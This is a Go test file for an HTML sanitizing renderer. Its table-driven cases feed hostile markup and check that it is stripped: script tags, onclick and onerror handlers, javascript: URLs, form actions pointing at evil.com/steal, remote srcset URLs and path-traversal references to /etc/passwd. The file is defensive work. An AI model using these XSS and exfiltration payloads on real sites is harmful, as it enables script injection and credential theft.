package html_test

import (
	"context"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/authzed/openagentprimitives/pkg/channels/channelassets"
	"github.com/authzed/openagentprimitives/pkg/channels/channelassets/html"
)

// render is a tiny helper so per-case tests don't repeat the
// `r := html.New(); out, err := r.Render(...)` boilerplate.
func render(t *testing.T, payload string) channelassets.Output {
	t.Helper()
	r := html.New()
	out, err := r.Render(context.Background(), channelassets.Input{Payload: []byte(payload)})
	require.NoError(t, err, "Render")
	return out
}

// TestRenderer_SanitizationMatrix exercises strip-vs-preserve across every
// dangerous/benign construct pair that matters. Each row names substrings that
// MUST appear in the rendered output and substrings that MUST NOT. Outliers
// (warnings, CSP injection, size limits) stay as discrete tests below.
func TestRenderer_SanitizationMatrix(t *testing.T) {
	cases := []struct {
		name           string
		payload        string
		mustContain    []string
		mustNotContain []string
	}{
		{
			name:           "<script> stripped: benign content preserved",
			payload:        `<h1>Hi</h1><script>alert(1)</script><p>body</p>`,
			mustContain:    []string{"<h1>Hi</h1>", "<p>body</p>"},
			mustNotContain: []string{"<script", "alert("},
		},
		{
			// Form controls are inert: on*/formaction are stripped and CSP
			// form-action 'none' blocks submission, making them safe UI mockup
			// elements. The element survives; the action attribute does not.
			name:           "<form>/<input> allowed (inert); action stripped",
			payload:        `<form action="https://evil.com/steal"><input type="password" placeholder="pw"></form>`,
			mustContain:    []string{"<form", "<input", `placeholder="pw"`},
			mustNotContain: []string{`action="https://evil.com/steal"`},
		},
		{
			name:        "semantic sectioning elements survive WITH class hooks",
			payload:     `<main class="sheet"><header class="head">h</header><footer class="foot">f</footer><nav class="n">x</nav></main>`,
			mustContain: []string{`<main class="sheet"`, `<header class="head"`, `<footer class="foot"`, `<nav class="n"`},
		},
		{
			name:        "details/summary/dialog/figcaption survive",
			payload:     `<details class="d"><summary>s</summary>body</details><figure><figcaption class="fc">cap</figcaption></figure><dialog class="dl">x</dialog>`,
			mustContain: []string{`<details class="d"`, "<summary>", `<figcaption class="fc"`, `<dialog class="dl"`},
		},
		{
			name:        "aria-* and role attributes preserved",
			payload:     `<div role="note" aria-hidden="true" aria-label="x">y</div>`,
			mustContain: []string{`role="note"`, `aria-hidden="true"`, `aria-label="x"`},
		},
		{
			// <button> is allowed, but formaction — a submission-redirect
			// vector — is stripped off it.
			name:           "button allowed but formaction stripped",
			payload:        `<button formaction="https://evil.com/steal" type="button">go</button>`,
			mustContain:    []string{"<button", `type="button"`},
			mustNotContain: []string{"formaction"},
		},
		{
			// srcset is not URL-validated by bluemonday, so it is NOT allowed —
			// the remote-reference surface stays closed (CSP also backstops).
			name:           "source allowed but srcset (remote URL) stripped",
			payload:        `<picture><source srcset="https://evil.example/a.png" media="(min-width:1px)"><img src="data:image/png;base64,iVBORw0KGgo=" alt="x"></picture>`,
			mustContain:    []string{"<source", "data:image/png"},
			mustNotContain: []string{"srcset", "evil.example"},
		},
		{
			name:           "onclick handler stripped: href preserved",
			payload:        `<a href="https://example.com" onclick="exfil()">click</a>`,
			mustContain:    []string{`href="https://example.com"`},
			mustNotContain: []string{"onclick", "exfil"},
		},
		{
			name:           "<iframe> stripped",
			payload:        `<iframe src="https://evil.example/embed"></iframe>`,
			mustNotContain: []string{"<iframe"},
		},
		{
			name:           "javascript: URL stripped",
			payload:        `<a href="javascript:exfil()">click</a>`,
			mustNotContain: []string{"javascript:"},
		},
		{
			name:           "data:text/html URL stripped",
			payload:        `<a href="data:text/html,<script>alert(1)</script>">click</a>`,
			mustNotContain: []string{"data:text/html"},
		},
		{
			name:           "<svg> stripped (denied MIME)",
			payload:        `<svg><script>alert(1)</script></svg>`,
			mustNotContain: []string{"<svg", "<script"},
		},
		{
			name:        "data:image/png allowed on <img>",
			payload:     `<img src="data:image/png;base64,iVBORw0KGgo=" alt="ok">`,
			mustContain: []string{"data:image/png"},
		},
		{
			name:        "class attribute preserved (regression: report styles)",
			payload:     `<div class="panel warn"><span class="pill high">x</span></div>`,
			mustContain: []string{`class="panel warn"`, `class="pill high"`},
		},
		{
			name:        "id attribute preserved (anchor links)",
			payload:     `<h2 id="goals">Goals</h2><a href="#goals">jump</a>`,
			mustContain: []string{`id="goals"`},
		},
		{
			// UGCPolicy constrains title to a Paragraph regex that rejects
			// common punctuation (colon, $, %, ?, …), silently stripping
			// legitimate tooltips. Allowed globally instead, safe because the
			// value is inert and HTML-escaped behind the CSP + sandbox.
			name:        "title attribute with punctuation preserved",
			payload:     `<span title="Cost: $5 (50% off)? yes!">x</span>`,
			mustContain: []string{`title="Cost: $5 (50% off)? yes!"`},
		},
		{
			// With title unconstrained, escaping-on-output is what keeps it
			// safe: a value crafted to break out has its " escaped to &#34;
			// and its injected < > to &lt;/&gt;, so no real tag is emitted.
			name:           "title with quote/angle escaped, not attribute breakout",
			payload:        `<span title="a&quot;><img src=x onerror=alert(1)>">y</span>`,
			mustContain:    []string{`title="a&#34;&gt;&lt;img`},
			mustNotContain: []string{`"><img src=x`},
		},
		{
			name:        "inline style + <style> element preserved",
			payload:     `<div style="color: red;"><style>.x{color:blue}</style>hi</div>`,
			mustContain: []string{`style="color: red;"`, "<style>"},
		},
		{
			// SVG referenced via a data: URL on <img src> is safe: the browser
			// renders it as an image and runs no script (unlike inline <svg>).
			name:        "data:image/svg+xml on <img src> allowed (base64)",
			payload:     `<img src="data:image/svg+xml;base64,PHN2Zy8+" alt="x">`,
			mustContain: []string{"data:image/svg+xml"},
		},
		{
			name:        "data:image/svg+xml on <img src> allowed (url-encoded)",
			payload:     `<img src="data:image/svg+xml,%3Csvg%2F%3E" alt="x">`,
			mustContain: []string{"data:image/svg+xml"},
		},
		{
			// But a data:svg on <a href> is a navigation→script vector (an SVG
			// opened as a top-level document DOES execute script), so it stays
			// stripped. CSP meta legitimately contains "data:" in img-src/
			// font-src, so we check the svg URI specifically.
			name:           "data:image/svg+xml on <a href> stripped",
			payload:        `<a href="data:image/svg+xml;base64,PHN2Zy8+">click</a>`,
			mustNotContain: []string{"data:image/svg", "image/svg+xml", `href="data:`},
		},
		{
			// data: on <a href> is stripped regardless of MIME (a raster data:
			// link is also a navigation vector; only <img src> data: is kept).
			name:           "data:image/png on <a href> stripped",
			payload:        `<a href="data:image/png;base64,iVBORw0KGgo=">click</a>`,
			mustNotContain: []string{`href="data:`},
		},
		{
			name:        "artifact: ref kept on <img src>",
			payload:     `<img src="artifact:ar-abc123" alt="logo">`,
			mustContain: []string{`src="artifact:ar-abc123"`},
		},
		{
			// rel is "stylesheet nofollow", not bare "stylesheet":
			// RequireNoFollowOnLinks(true) appends " nofollow" to rel on any
			// href-bearing a/area/base/link, after the rel="^stylesheet$"
			// allow-match runs. Harmless — rel is a space-separated token set
			// and "stylesheet" still triggers the CSS load.
			name:        "artifact: ref kept on <link rel=stylesheet>",
			payload:     `<link rel="stylesheet" href="artifact:ar-css01">`,
			mustContain: []string{`href="artifact:ar-css01"`, `rel="stylesheet nofollow"`},
		},
		{
			name:           "artifact: ref stripped from <a href> (nav)",
			payload:        `<a href="artifact:ar-abc">x</a>`,
			mustNotContain: []string{"artifact:"},
		},
		{
			name:           "malformed artifact: ref stripped from <img>",
			payload:        `<img src="artifact:../../etc/passwd">`,
			mustNotContain: []string{"artifact:"},
		},
		{
			// Path traversal by dot-run rather than "/../": isArtifactRefValue
			// rejects any ".." substring, so a handle whose body is exactly
			// ".." never survives a charset check.
			name:           "artifact: ref with .. handle stripped from <img>",
			payload:        `<img src="artifact:ar-..">`,
			mustNotContain: []string{"artifact:"},
		},
		{
			// <link href> is scoped to artifact: only. There is no legitimate
			// external stylesheet on <link> (inline CSS uses <style>), so an
			// otherwise-globally-allowed https: value is still dropped here.
			name:           "external href stripped from <link rel=stylesheet>",
			payload:        `<link rel="stylesheet" href="https://evil.example/x.css">`,
			mustContain:    []string{"<link", `rel="stylesheet nofollow"`},
			mustNotContain: []string{"href=", "evil.example"},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			body := string(render(t, tc.payload).Bytes)
			for _, want := range tc.mustContain {
				assert.Containsf(t, body, want, "must contain %q in: %s", want, body)
			}
			for _, bad := range tc.mustNotContain {
				assert.NotContainsf(t, body, bad, "must not contain %q in: %s", bad, body)
			}
		})
	}
}

func TestRenderer_StripsScriptEmitsWarning(t *testing.T) {
	out, err := html.New().Render(context.Background(), channelassets.Input{
		Payload: []byte(`<h1>Hi</h1><script>alert(1)</script><p>body</p>`),
	})
	require.NoError(t, err, "Render")
	var found bool
	for _, w := range out.Warnings {
		if w.Kind == "tag" && w.Name == "script" {
			found = true
			assert.Equal(t, "removed", w.Action)
		}
	}
	assert.True(t, found, "warnings must mention <script>; got %v", out.Warnings)
}

func TestRenderer_InjectsCSPMeta(t *testing.T) {
	body := string(render(t, `<html><head><title>t</title></head><body>hi</body></html>`).Bytes)
	assert.Contains(t, body, `http-equiv="Content-Security-Policy"`, "CSP meta present")
	assert.Contains(t, body, "default-src 'none'", "CSP default-src 'none' present")
}

func TestRenderer_InjectsCSPWhenNoHead(t *testing.T) {
	body := string(render(t, `<h1>hi</h1>`).Bytes)
	assert.Contains(t, body, "Content-Security-Policy", "CSP meta injected even with headless input")
}

func TestRenderer_PayloadTooLarge(t *testing.T) {
	r := html.New()
	big := make([]byte, r.MaxInputSize()+1)
	for i := range big {
		big[i] = 'x'
	}
	_, err := r.Render(context.Background(), channelassets.Input{Payload: big})
	require.Error(t, err, "input > MaxInputSize must error")
}

func TestRenderer_OutputTooLarge(t *testing.T) {
	r := html.New()
	huge := strings.Repeat("<p>x</p>", int(r.MaxOutputSize()))
	_, err := r.Render(context.Background(), channelassets.Input{Payload: []byte(huge)})
	require.Error(t, err, "output > MaxOutputSize must error")
}

func TestRenderer_PreservesFilenameDefaultHTMLExtension(t *testing.T) {
	r := html.New()
	out, err := r.Render(context.Background(), channelassets.Input{
		Payload:  []byte(`<h1>hi</h1>`),
		Filename: "report",
	})
	require.NoError(t, err, "Render")
	assert.True(t, strings.HasSuffix(out.Filename, ".html"), "filename should have .html ext, got %q", out.Filename)
}

func TestRenderer_SupportsLiveView(t *testing.T) {
	assert.True(t, html.New().SupportsLiveView(), "html renderer supports live-view")
}

// TestRenderer_FragmentHrefSurvives confirms that same-document #fragment links
// pass through sanitization intact. Fragment hrefs are needed by the css kind's
// :target tab navigation; they are safe because the artifact is served inside a
// sandboxed iframe where a relative href can only scroll within the same document.
func TestRenderer_FragmentHrefSurvives(t *testing.T) {
	out := render(t, `<a href="#sec">jump</a><h2 id="sec">Section</h2>`)
	body := string(out.Bytes)
	assert.Contains(t, body, `href="#sec"`, "fragment href must survive sanitization")
	assert.Contains(t, body, `id="sec"`, "anchor target id must survive sanitization")
}

func TestRender_RejectsMalformedPayload(t *testing.T) {
	r := html.New()
	cases := []struct {
		name    string
		payload string
	}{
		{
			name:    "truncated mid-tag inside a data: URI: rejected",
			payload: `<!DOCTYPE html><html><head><style>.x{color:red}</style></head><body><header><img alt="logo" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAA`,
		},
		{
			name:    "fully entity-encoded payload: rejected",
			payload: `&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hi&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;`,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			_, err := r.Render(context.Background(), channelassets.Input{Payload: []byte(tc.payload)})
			require.Error(t, err)
			assert.ErrorIs(t, err, channelassets.ErrMalformedPayload)
		})
	}
}

func TestRender_AcceptsValidDocument(t *testing.T) {
	r := html.New()
	cases := []struct {
		name    string
		payload string
	}{
		{
			name:    "full document with an escaped tag inside a paragraph",
			payload: `<!DOCTYPE html><html><head><style>.x{color:red}</style></head><body><header><h1>Title</h1></header><p>Body text with an escaped &lt;tag&gt; inside a paragraph.</p></body></html>`,
		},
		{
			// Regression: isFullyEscaped must not flag ordinary tag-less plain
			// text as entity-encoded markup — it has zero element nodes (like
			// genuinely escaped markup) but contains no "&lt;" marker.
			name:    "tag-less plain text",
			payload: `All checks passed.`,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			out, err := r.Render(context.Background(), channelassets.Input{Payload: []byte(tc.payload)})
			require.NoError(t, err)
			assert.NotEmpty(t, out.Bytes)
		})
	}
}

func TestInstructions_DescribesWarningsFeedback(t *testing.T) {
	s := html.New().Instructions()
	// The agent must be steered to the structured warnings feedback loop.
	assert.Contains(t, s, "warnings", "must mention the warnings feedback field")
	assert.Contains(t, s, "unwrapped", "must explain the unwrapped action")
	assert.Contains(t, s, "form", "must mention form controls are allowed")
	// "remote stylesheets" describes something the policy does not do; the
	// instructions must not drift back to claiming it.
	assert.NotContains(t, s, "remote stylesheets", "stale stripped-list wording removed")
}

func TestInstructions_DescribesAssetReferences(t *testing.T) {
	got := html.New().Instructions()
	assert.Contains(t, got, "artifact:", "must teach the artifact: handle reference")
	assert.Contains(t, got, "NEVER", "must warn against hand-emitting base64 raster")
	assert.Contains(t, got, "container_file", "must point at code-exec for generated raster")
	assert.Contains(t, got, "tool_output", "must point at tool_output for fetched assets")
	assert.NotContains(t, got, "remote stylesheets", "keep the pre-existing stale-string invariant")
}
